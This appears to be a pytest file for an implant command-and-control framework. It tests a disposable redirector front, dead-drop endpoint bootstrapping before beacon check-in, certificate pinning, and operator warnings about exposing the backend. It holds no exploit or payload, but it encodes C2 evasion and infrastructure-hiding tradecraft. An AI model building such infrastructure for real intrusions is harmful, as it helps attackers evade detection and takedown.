"""Redirector-first C2 front + dead-drop bootstrap.

Two beacon hardenings, and the guardrail that keeps them honest:

* `c2.front` is the DISPOSABLE public hop beacons are built against. When set
  it is embedded instead of the operator's own listener, so a captured beacon
  points at something burnable rather than at the backend.
* `c2.bootstrap_dead_drop` makes the beacon resolve its live endpoint from the
  dead drop BEFORE the first check-in, so the indirection can be rotated
  without a rebuild. The compiled endpoint becomes only a fallback rung.

The C++ side is pinned by reading the generated header and the beacon source,
because a format/flag drift between the two sides is silent.
"""
import os
import re

import pytest

from phantom.utils import network

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_SRC = os.path.join(_ROOT, "phantom", "payloads", "beacon", "src")


def _read(name):
    with open(os.path.join(_SRC, name), encoding="utf-8") as fh:
        return fh.read()


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    """No ambient front/host: every test states its own."""
    for var in ("PHANTOM_C2_FRONT", "PHANTOM_C2_HOST", "PHANTOM_C2_PORT",
                "PHANTOM_C2_FRONT_CERT", "PHANTOM_C2_PINS",
                "PHANTOM_C2_PUBKEY_PINS"):
        monkeypatch.delenv(var, raising=False)


# ── get_c2_front ────────────────────────────────────────────────────────

def test_front_unset_is_none():
    assert network.get_c2_front() is None


def test_front_parses_host_and_port(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", "front.example.net:8443")
    assert network.get_c2_front() == ("front.example.net", 8443, True)


def test_front_defaults_port_and_ssl(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", "front.example.net")
    host, port, ssl_on = network.get_c2_front()
    assert host == "front.example.net"
    assert port > 0 and ssl_on is True


def test_front_strips_scheme_and_path(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", "https://front.example.net:9443/x/y")
    assert network.get_c2_front()[0] == "front.example.net"
    assert network.get_c2_front()[1] == 9443


def test_front_blank_is_none(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", "   ")
    assert network.get_c2_front() is None


# ── get_c2_endpoint prefers the front ───────────────────────────────────

def test_endpoint_prefers_the_front(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", "front.example.net:8443")
    assert network.get_c2_endpoint() == ("front.example.net", 8443)


def test_explicit_env_override_beats_the_front(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", "front.example.net:8443")
    monkeypatch.setenv("PHANTOM_C2_HOST", "operator.example.org")
    assert network.get_c2_endpoint()[0] == "operator.example.org"


# ── front_guard_reason ──────────────────────────────────────────────────

def test_guard_silent_when_a_front_covers(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", "front.example.net:443")
    monkeypatch.setenv("PHANTOM_C2_HOST", "backend.internal")
    assert network.front_guard_reason("front.example.net") is None


def test_guard_flags_front_equal_to_backend(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", "same.example.net")
    monkeypatch.setenv("PHANTOM_C2_HOST", "same.example.net")
    reason = network.front_guard_reason("same.example.net")
    assert reason and "DISPOSABLE" in reason


def test_guard_flags_missing_front_with_routable_host(monkeypatch):
    reason = network.front_guard_reason("203.0.113.10")
    assert reason and "c2.front" in reason


def test_guard_silent_without_front_on_loopback(monkeypatch):
    # a lab/loopback build is not "leaking the backend" — there is none yet
    assert network.front_guard_reason("127.0.0.1") is None


# ── config plane ────────────────────────────────────────────────────────

def test_new_keys_are_declared():
    from phantom.utils import config as cfg
    for key in ("c2.front", "c2.dead_drop", "c2.bootstrap_dead_drop",
                "c2.front_cert", "c2.pins", "c2.pubkey_pins"):
        assert key in cfg.SCHEMA, key
    assert cfg.DEFAULTS["c2"]["front"] == ""
    assert cfg.DEFAULTS["c2"]["bootstrap_dead_drop"] is True
    assert cfg.DEFAULTS["c2"]["front_cert"] == ""


# ── pin derivation for a TLS-terminating front ───────────────────────────

def test_the_pin_cert_is_the_front_cert_when_a_front_is_set(tmp_path,
                                                            monkeypatch):
    monkeypatch.setenv("PHANTOM_DATA_DIR", str(tmp_path))
    cert = tmp_path / "front.crt"
    cert.write_text("placeholder", encoding="utf-8")
    monkeypatch.setenv("PHANTOM_C2_FRONT", "front.example.net")
    monkeypatch.setenv("PHANTOM_C2_FRONT_CERT", str(cert))
    assert network.get_c2_front_cert() == str(cert)
    # ...and that is what the build must pin
    assert network.c2_pin_cert_path() == str(cert)


def test_front_cert_without_a_front_is_not_used(tmp_path, monkeypatch):
    monkeypatch.setenv("PHANTOM_DATA_DIR", str(tmp_path))
    cert = tmp_path / "front.crt"
    cert.write_text("placeholder", encoding="utf-8")
    monkeypatch.delenv("PHANTOM_C2_FRONT", raising=False)
    monkeypatch.setenv("PHANTOM_C2_FRONT_CERT", str(cert))
    # no front -> the beacon dials the backend, whose own certificate is right
    assert network.c2_pin_cert_path() == ""


def test_a_missing_front_cert_path_is_ignored(tmp_path, monkeypatch):
    monkeypatch.setenv("PHANTOM_DATA_DIR", str(tmp_path))
    monkeypatch.setenv("PHANTOM_C2_FRONT_CERT", str(tmp_path / "nope.crt"))
    assert network.get_c2_front_cert() == ""


def test_conventional_front_cert_is_picked_up(tmp_path, monkeypatch):
    monkeypatch.setenv("PHANTOM_DATA_DIR", str(tmp_path))
    monkeypatch.delenv("PHANTOM_C2_FRONT_CERT", raising=False)
    monkeypatch.setenv("PHANTOM_C2_FRONT", "front.example.net")
    certs = tmp_path / "certs"
    certs.mkdir()
    (certs / "front.crt").write_text("placeholder", encoding="utf-8")
    assert network.c2_pin_cert_path() == str(certs / "front.crt")


def test_the_builder_pins_the_front_certificate():
    with open(os.path.join(_ROOT, "phantom", "utils", "builder.py"),
              encoding="utf-8") as fh:
        src = fh.read()
    assert "c2_pin_cert_path" in src
    assert "beacon_pin(pin_cert)" in src
    assert "beacon_pubkey_pin(pin_cert)" in src


# ── generated header ────────────────────────────────────────────────────

def test_header_emits_the_bootstrap_flag(tmp_path, monkeypatch):
    monkeypatch.setenv("PHANTOM_DATA_DIR", str(tmp_path))
    from phantom.utils.c2_crypto import write_beacon_c2_config
    beacon = tmp_path / "beacon"
    write_beacon_c2_config(str(beacon), host="front.example.net", port=8443,
                           dead_drop="https://paste.example/x",
                           bootstrap_dead_drop=False)
    text = (beacon / "src" / "c2_config.h").read_text(encoding="utf-8")
    assert '#define C2_HOST "front.example.net"' in text
    assert "#define C2_DEADDROP_BOOTSTRAP 0" in text


def test_header_defaults_the_bootstrap_on(tmp_path, monkeypatch):
    monkeypatch.setenv("PHANTOM_DATA_DIR", str(tmp_path))
    from phantom.utils.c2_crypto import write_beacon_c2_config
    beacon = tmp_path / "beacon"
    write_beacon_c2_config(str(beacon), host="front.example.net")
    text = (beacon / "src" / "c2_config.h").read_text(encoding="utf-8")
    assert "#define C2_DEADDROP_BOOTSTRAP 1" in text


# ── C++ contract pin ────────────────────────────────────────────────────

def test_beacon_header_defaults_the_flag_on():
    src = _read("network.h")
    assert "#ifndef C2_DEADDROP_BOOTSTRAP" in src
    assert re.search(r"#define\s+C2_DEADDROP_BOOTSTRAP\s+1", src)
    assert "dd_bootstrap_done" in src


def test_beacon_bootstraps_before_the_first_checkin():
    main = _read("main.cpp")
    i_boot = main.index("#if C2_DEADDROP_BOOTSTRAP")
    i_check = main.index("std::string response = net::checkin(cfg, telemetry);")
    assert i_boot < i_check, "the dead-drop bootstrap must run before check-in"
    assert "refresh_from_dead_drop(cfg)" in main[i_boot:i_check]


# ── doctor posture ──────────────────────────────────────────────────────

def test_doctor_warns_without_a_front(monkeypatch):
    from phantom.core import doctor
    monkeypatch.setattr(network, "get_c2_front", lambda: None)
    check = doctor._c2_front_check()
    assert check.status == "warn"
    assert "c2.front" in check.hint


def test_doctor_passes_with_a_clean_front(monkeypatch):
    from phantom.core import doctor
    monkeypatch.setattr(network, "get_c2_front",
                        lambda: ("front.example.net", 443, True))
    check = doctor._c2_front_check()
    assert check.status == "pass"
    assert "front.example.net" in check.detail


def test_doctor_warns_when_front_is_the_backend(monkeypatch):
    from phantom.core import doctor
    monkeypatch.setenv("PHANTOM_C2_HOST", "backend.example.net")
    monkeypatch.setattr(network, "get_c2_front",
                        lambda: ("backend.example.net", 443, True))
    check = doctor._c2_front_check()
    assert check.status == "warn"
    assert "DISPOSABLE" in check.hint


def test_doctor_reports_the_check():
    from phantom.core.doctor import run_doctor
    names = {c.name for c in run_doctor(net=False).checks}
    assert "c2-front" in names


# ── dead-drop publish convenience ───────────────────────────────────────

def test_publish_without_args_uses_the_current_front(monkeypatch):
    from phantom.core.shell.commands import system
    from phantom.utils import dead_drop as dd

    captured = {}

    def _publish(url, host, port, use_ssl=True, **kw):
        captured.update(url=url, host=host, port=port, use_ssl=use_ssl)
        return True

    monkeypatch.setattr(dd, "configured_url", lambda: "https://paste.example/x")
    monkeypatch.setattr(dd, "publish", _publish)
    monkeypatch.setattr(network, "get_c2_endpoint",
                        lambda: ("front.example.net", 8443))
    system._cmd_config_dead_drop(["dead-drop", "publish"])
    assert captured == {"url": "https://paste.example/x",
                        "host": "front.example.net", "port": 8443,
                        "use_ssl": True}


def test_publish_with_args_still_honours_them(monkeypatch):
    from phantom.core.shell.commands import system
    from phantom.utils import dead_drop as dd

    captured = {}

    def _publish(url, host, port, use_ssl=True, **kw):
        captured.update(host=host, port=port, use_ssl=use_ssl)
        return True

    monkeypatch.setattr(dd, "configured_url", lambda: "https://paste.example/x")
    monkeypatch.setattr(dd, "publish", _publish)
    system._cmd_config_dead_drop(["dead-drop", "publish", "hop.example", "9443",
                                  "http"])
    assert captured == {"host": "hop.example", "port": 9443, "use_ssl": False}
